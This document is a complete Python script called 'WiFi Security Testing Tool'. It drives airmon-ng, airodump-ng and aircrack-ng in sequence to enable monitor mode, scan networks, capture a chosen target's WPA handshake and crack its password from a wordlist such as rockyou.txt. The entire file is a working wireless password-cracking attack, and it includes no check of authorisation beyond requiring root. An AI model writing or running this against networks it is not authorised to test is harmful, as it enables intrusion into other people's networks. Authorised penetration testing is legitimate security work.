#!/usr/bin/env python3
import subprocess
import os

def enable_monitor_mode(interface):
    print("[*] Enabling monitor mode...")
    subprocess.call(["airmon-ng", "start", interface])

def scan_networks(interface):
    print("[*] Scanning for networks. Press Ctrl+C to stop...")
    subprocess.call(["airodump-ng", interface])

def capture_handshake(interface, bssid, channel):
    print("[*] Capturing WPA handshake. Press Ctrl+C when handshake is captured...")
    subprocess.call([
        "airodump-ng",
        "--bssid", bssid,
        "-c", channel,
        "-w", "capture",
        interface
    ])

def crack_password(cap_file, wordlist, bssid):
    print("[*] Starting password cracking...")
    subprocess.call([
        "aircrack-ng",
        "-w", wordlist,
        "-b", bssid,
        cap_file
    ])

def main():
    print("=== WiFi Security Testing Tool ===")
    interface = input("Enter your Wi-Fi interface (e.g., wlan0): ")

    if not interface:
        print("No interface provided.")
        return

    enable_monitor_mode(interface)
    mon_interface = interface + "mon"

    input("\n[*] Press Enter to scan for networks. After Ctrl+C, enter target details.")
    scan_networks(mon_interface)

    bssid = input("\nTarget BSSID (MAC address): ")
    channel = input("Channel number: ")
    capture_handshake(mon_interface, bssid, channel)

    cap_file = input("\nCaptured .cap file (e.g., capture-01.cap): ")
    wordlist = input("Password list file (e.g., rockyou.txt): ")
    crack_password(cap_file, wordlist, bssid)

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("You must run this tool as root (sudo).")
    else:
        main()
